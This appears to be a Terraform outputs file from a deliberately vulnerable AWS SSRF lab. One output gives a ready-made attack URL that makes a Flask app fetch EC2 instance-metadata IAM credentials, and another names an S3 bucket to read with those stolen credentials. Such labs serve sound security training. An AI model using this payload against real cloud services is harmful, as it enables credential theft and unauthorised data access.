output "instance_public_ip" {
  value       = aws_instance.vulnerable.public_ip
  description = "IP of the vulnerable EC2 instance"
}

output "app_url" {
  value       = "http://${aws_instance.vulnerable.public_ip}:5000"
  description = "URL of the vulnerable Flask app"
}

output "ssrf_attack_url" {
  value       = "http://${aws_instance.vulnerable.public_ip}:5000/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ssrf-lab-ec2-role"
  description = "The exact SSRF attack URL"
}

output "s3_bucket_name" {
  value       = aws_s3_bucket.sensitive.id
  description = "The sensitive S3 bucket to access with stolen credentials"
}
